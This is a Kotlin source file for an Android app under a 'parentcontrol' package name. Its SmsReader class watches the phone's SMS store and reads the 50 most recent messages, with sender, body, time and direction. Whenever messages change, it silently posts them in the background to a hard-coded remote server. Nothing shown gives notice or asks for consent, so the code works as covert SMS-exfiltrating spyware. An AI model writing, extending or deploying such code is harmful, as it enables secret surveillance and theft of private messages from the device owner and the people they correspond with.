package com.parentcontrol.app

import android.content.Context
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.Looper
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject

class SmsReader(private val context: Context) {

    private val SERVER_URL = "https://overflowing-perception-production-17b2.up.railway.app/sms"
    private val DEVICE_NAME = android.os.Build.MODEL

    fun startObserving() {
        val observer = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean) {
                readLatestSms()
            }
        }
        context.contentResolver.registerContentObserver(
            Uri.parse("content://sms"), true, observer
        )
        readLatestSms()
    }

    fun readLatestSms() {
        Thread {
            try {
                val smsList = JSONArray()
                val cursor = context.contentResolver.query(
                    Uri.parse("content://sms"),
                    arrayOf("address", "body", "date", "type"),
                    null, null, "date DESC LIMIT 50"
                )
                cursor?.use {
                    while (it.moveToNext()) {
                        val sms = JSONObject().apply {
                            put("from", it.getString(0) ?: "")
                            put("body", it.getString(1) ?: "")
                            put("time", it.getLong(2))
                            put("type", if (it.getInt(3) == 1) "inbox" else "sent")
                        }
                        smsList.put(sms)
                    }
                }
                val json = JSONObject().apply {
                    put("device", DEVICE_NAME)
                    put("sms", smsList)
                }
                val body = json.toString().toRequestBody("application/json".toMediaType())
                OkHttpClient().newCall(
                    Request.Builder().url(SERVER_URL).post(body).build()
                ).execute()
            } catch (e: Exception) { e.printStackTrace() }
        }.start()
    }
}
